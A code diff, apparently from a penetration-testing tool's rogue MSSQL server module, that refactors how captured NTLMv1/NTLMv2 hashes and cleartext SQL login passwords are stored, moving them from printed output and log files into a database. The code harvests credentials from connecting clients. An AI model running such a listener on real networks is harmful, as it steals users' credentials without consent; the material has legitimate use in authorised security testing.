@@ -74,20 +74,42 @@ def ParseSQLHash(data, client):
 	User          = SSPIStart[UserOffset:UserOffset+UserLen].replace('\x00','')
 
 	if NthashLen == 24:
-		print text("[MSSQL] NTLMv1 Client   : %s" % color(client, 3, 0))
-		print text("[MSSQL] NTLMv1 Domain   : %s" % color(Domain, 3, 0))
-		print text("[MSSQL] NTLMv1 User     : %s" % color(User, 3, 0))
-		print text("[MSSQL] NTLMv1 Hash     : %s" % color(LMHash+":"+NTHash, 3, 0))
 		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, settings.Config.NumChal)
-		WriteData(settings.Config.MSSQLNTLMv1Log % client, User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
+
+		SaveToDb({
+			'module': 'MSSQL', 
+			'type': 'NTLMv1', 
+			'client': client, 
+			'user': Domain+'\\'+User, 
+			'hash': LMHash+":"+NTHash, 
+			'fullhash': WriteHash,
+		})
+
+		#print text("[MSSQL] NTLMv1 Client   : %s" % color(client, 3, 0))
+		#print text("[MSSQL] NTLMv1 Domain   : %s" % color(Domain, 3, 0))
+		#print text("[MSSQL] NTLMv1 User     : %s" % color(User, 3, 0))
+		#print text("[MSSQL] NTLMv1 Hash     : %s" % color(LMHash+":"+NTHash, 3, 0))
+		#WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, LMHash, NTHash, settings.Config.NumChal)
+		#WriteData(settings.Config.MSSQLNTLMv1Log % client, User+"::"+Domain+":"+LMHash+":"+NtHash+":"+NumChal, User+"::"+Domain)
 
 	if NthashLen > 60:
-		print text("[MSSQL] NTLMv2 Client   : %s" % color(client, 3, 0))
-		print text("[MSSQL] NTLMv2 Domain   : %s" % color(Domain, 3, 0))
-		print text("[MSSQL] NTLMv2 User     : %s" % color(User, 3, 0))
-		print text("[MSSQL] NTLMv2 Hash     : %s" % color(NTHash[:32]+":"+NTHash[32:], 3, 0))
 		WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
-		WriteData(settings.Config.MSSQLNTLMv2Log % client, WriteHash,User+"::"+Domain)
+		
+		SaveToDb({
+			'module': 'MSSQL', 
+			'type': 'NTLMv2', 
+			'client': client, 
+			'user': Domain+'\\'+User, 
+			'hash': NTHash[:32]+":"+NTHash[32:], 
+			'fullhash': WriteHash,
+		})
+
+		#print text("[MSSQL] NTLMv2 Client   : %s" % color(client, 3, 0))
+		#print text("[MSSQL] NTLMv2 Domain   : %s" % color(Domain, 3, 0))
+		#print text("[MSSQL] NTLMv2 User     : %s" % color(User, 3, 0))
+		#print text("[MSSQL] NTLMv2 Hash     : %s" % color(NTHash[:32]+":"+NTHash[32:], 3, 0))
+		#WriteHash = '%s::%s:%s:%s:%s' % (User, Domain, settings.Config.NumChal, NTHash[:32], NTHash[32:])
+		#WriteData(settings.Config.MSSQLNTLMv2Log % client, WriteHash,User+"::"+Domain)
 
 def ParseSqlClearTxtPwd(Pwd):
 	Pwd = map(ord,Pwd.replace('\xa5',''))
@@ -100,19 +122,31 @@ def ParseClearTextSQLPass(data, client):
 
 	TDS = TDS_Login_Packet(data)
 
-	print text("[MSSQL] Client    : %s (%s)" % (color(client, 3, 0) , color(TDS.ClientName, 3, 0)))
-	print text("[MSSQL] Server    : %s" % color(TDS.ServerName, 3, 0))
-	print text("[MSSQL] Database  : %s" % color(TDS.DatabaseName, 3, 0))
-	print text("[MSSQL] Username  : %s" % color(TDS.UserName, 3, 0))
-	print text("[MSSQL] Password  : %s" % color(ParseSqlClearTxtPwd(TDS.Password), 3, 0))
-	WritePass = TDS.UserName +':'+ ParseSqlClearTxtPwd(TDS.Password)
-	WriteData(settings.Config.MSSQLClearLog % client, WritePass, WritePass)
+	SaveToDb({
+		'module': 'MSSQL', 
+		'type': 'Cleartext', 
+		'client': client,
+		'hostname': "%s (%s)" % (TDS.ServerName, TDS.DatabaseName),
+		'user': TDS.UserName, 
+		'cleartext': ParseSqlClearTxtPwd(TDS.Password), 
+		'fullhash': TDS.UserName +':'+ ParseSqlClearTxtPwd(TDS.Password),
+	})
+
+	#print text("[MSSQL] Client    : %s (%s)" % (color(client, 3, 0) , color(TDS.ClientName, 3, 0)))
+	#print text("[MSSQL] Server    : %s" % color(TDS.ServerName, 3, 0))
+	#print text("[MSSQL] Database  : %s" % color(TDS.DatabaseName, 3, 0))
+	#print text("[MSSQL] Username  : %s" % color(TDS.UserName, 3, 0))
+	#print text("[MSSQL] Password  : %s" % color(ParseSqlClearTxtPwd(TDS.Password), 3, 0))
+	#WritePass = TDS.UserName +':'+ ParseSqlClearTxtPwd(TDS.Password)
+	#WriteData(settings.Config.MSSQLClearLog % client, WritePass, WritePass)
 
 # MSSQL Server class
 class MSSQL(BaseRequestHandler):
 
 	def handle(self):
-		print text("[MSSQL] Received connection from %s" % self.client_address[0])
+		if settings.Config.Verbose:
+			print text("[MSSQL] Received connection from %s" % self.client_address[0])
+	
 		try:
 			while True:
 				data = self.request.recv(1024)
